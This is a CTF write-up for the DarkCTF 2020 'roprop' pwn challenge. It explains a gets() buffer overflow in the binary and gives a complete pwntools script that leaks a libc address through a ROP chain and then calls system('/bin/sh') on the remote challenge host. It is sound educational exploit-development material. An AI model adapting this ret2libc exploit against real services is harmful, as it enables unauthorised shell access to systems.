DarkCTF2020: PWN - roprop
------------

Challenge Description:

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/pwn/images/roprop-description.PNG "Flag: DarkCTF{just_kidding}")

From the challenge description we can get one important detail, rope or "ROP" is going to be used in this challenge _this was the 1st pwn challenge in the ctf... yea! xD_

If we run the binary it will display a bunch of text and asks for an input, if you supply an input it will exit the program. Pretty straight forward!

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/pwn/images/roprop-1.PNG "Keep reading!")

Next step is to look at the binary in [ghidra](https://ghidra-sre.org/) 

```C++
undefined8 main(void)

{
  char local_58 [80];
  
  nvm_init();
  nvm_timeout();
  puts("Welcome to the Solar Designer World.\n");
  puts("He have got something for you since late 19\'s.\n");
  gets(local_58);
  return 0;
}
```

The main function is pretty short, _thank god!_, `local_58` is our input variable, as we can see from the line `gets(local_58)`, that input is a buffer of 80 bytes. 
>The gets function used here is extremely insecure as it does not limit the amount of input we store in the specified buffer, therefore a buffer overflow can occure.

Now lets check for the buffer overflow and if we can overwrite the instruction pointer `rip`, first we scream at the program... ehm, _observe_.

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/pwn/images/roprop-2.PNG "we all scream for ice-cream")

```S
# dmesg

[ 5615.822856] roprop[3444]: segfault at 7ff73e004141 ip 00007ff73e004141 sp 00007ffecb650c10 error 14 in libc-2.31.so[7ff73e1a2000+25000]
[ 5615.822865] Code: Bad RIP value.
```
`Segmentation fault` is a great indicator that the program crashed due to the buffer overflow, by providing "A"*90. When we run `dmesg` as root we will see that the crash was due to a bad RIP value, and the ip value has 2 `4141` in its LSB we can deduce the value of the offset to be `90 bytes - 2 bytes = 88 bytes` 

Now its time to craft the payload using python and pwntools.

```python
#!/usr/bin/env python3

from pwn import *

context.arch='amd64' #Specifying the arch of the binary
elf = ELF("./roprop") #Importing the binary as an ELF object
p = remote("roprop.darkarmy.xyz", 5002) #Specifying the host and port of the challenge where the flag is located
#p = elf.process()

offset = 88 #Calculated offset between our input buffer and the RIP
p.recvuntil("since late 19's.") #Recieving the output strings of the binary

########################
# Building the payload #
########################

rop = ROP(elf) #Creating the rop object from the imported binary -curtisy of pwntools-
rop.call("puts", [elf.got['puts']]) # Gadget 1` Adding the "puts" gadget and specifying its argument to be the address of libc puts in the global offset table (GOT)
rop.call("main") # Gadget 2` Adding the binary's main function in our ROP chain -as POC and sanity check-
craft = [
        b"A"*offset,
        rop.chain() # Creating the chain and linking the gadgets, specified above, together
]

payload = b"".join(craft) # The payload will leak the address of puts and run the main function again.
p.sendline(payload) # Send the payload
p.recvline()
p.recvline()
puts = u64(p.recvline().rstrip().ljust(8, b"\x00")) # Display the puts address in an unpacked 64-bin format
log.info(f"puts found at {hex(puts)}") # Log our findings

# After getting the address of puts we should search on libc database website for the correct libc version that the server is using, download that libc.so file and use it in the next payload

##########################
# Importing libc gadgets #
##########################

libc = ELF("libc6_2.27-3ubuntu1.2_amd64.so") # Creating the ELF object of the correct libc version
libc.address = puts - libc.symbols['puts'] # Adjusting our libc address to be equal to the server's run-time libc address
log.info(f"libc_base_address determined at {hex(libc.address)}") # Log our findings

rop = ROP(libc) # Creating the ROP object of our downloaded libc
rop.call('puts', [next(libc.search(b'/bin/sh\x00'))])  # Gadget 1` libc's puts with the argument to search for /bin/sh -POC and Sanity check
rop.call('system', [next(libc.search(b'/bin/sh\x00'))]) # Gadget 2` libc's system with the argument /bin/sh to get a shell
rop.call('exit') # Gadget 3` Gracefully exit the program
craft = [
        b"A"*offset,
        rop.chain() # Chainning our specified gadgets
]

payload = b"".join(craft) # Payload should output /bin/sh and execute system(/bin/sh) and give us a shell, when we are done should exit gracefully
p.sendline(payload)
p.interactive() # ls -la && cat flag.txt
```

With that script we should be able to solve the challenge, I took the liberty of explaining it in the comments and I do recommend researching of the topic because it is extremely vast and interesting. 

![img](https://github.com/FreezeLuiz/CTF-Writeups/blob/master/pwn/images/roprop-flag.png "hacker man!")